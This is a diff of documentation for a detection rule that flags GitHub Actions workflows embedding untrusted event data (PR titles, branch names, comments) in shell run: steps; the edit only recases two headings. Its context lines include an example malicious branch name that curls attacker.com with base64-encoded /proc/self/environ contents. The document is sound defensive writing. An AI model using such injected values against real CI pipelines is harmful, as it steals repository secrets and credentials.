@@ -27,7 +27,7 @@ generated: true
 
 This rule detects GitHub Actions workflows that embed untrusted `github.event` data, such as pull request titles, branch names, or issue comment bodies, directly into `run:` shell commands using expression syntax (`${{ }}`). An attacker who controls these values (by opening a PR, creating a branch, or posting a comment) can inject arbitrary shell commands that execute in the CI runner with the workflow's permissions.
 
-## Why This Matters
+## Why this matters
 
 GitHub Actions expression injection is a supply chain attack vector with severe consequences:
 
@@ -37,7 +37,7 @@ GitHub Actions expression injection is a supply chain attack vector with severe 
 - **Branch names are fully attacker-controlled.** An attacker can create a branch named `$(curl attacker.com/$(cat /proc/self/environ | base64))` and open a PR
 - **GitHub does not sanitize expressions.** `${{ github.event.pull_request.title }}` is interpolated verbatim into the shell command before execution
 
-## What Gets Flagged
+## What gets flagged
 
 **Pattern 1: Event data in run: commands**
 
